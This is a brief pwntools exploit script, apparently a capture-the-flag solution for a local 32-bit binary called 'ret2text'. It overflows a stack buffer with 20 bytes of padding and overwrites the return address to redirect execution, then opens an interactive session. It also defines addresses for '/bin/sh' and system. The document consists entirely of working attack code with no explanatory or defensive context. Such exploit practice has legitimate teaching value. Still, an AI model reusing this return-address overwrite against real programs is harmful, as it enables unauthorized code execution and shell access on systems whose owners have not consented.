from pwn import *
io = process('./ret2text')
bin_sh = 0x8048660
system = 0x80483B0 
payload = b'a'*(16+4)+p32(0x8048522)
io.sendline(payload)
io.interactive()
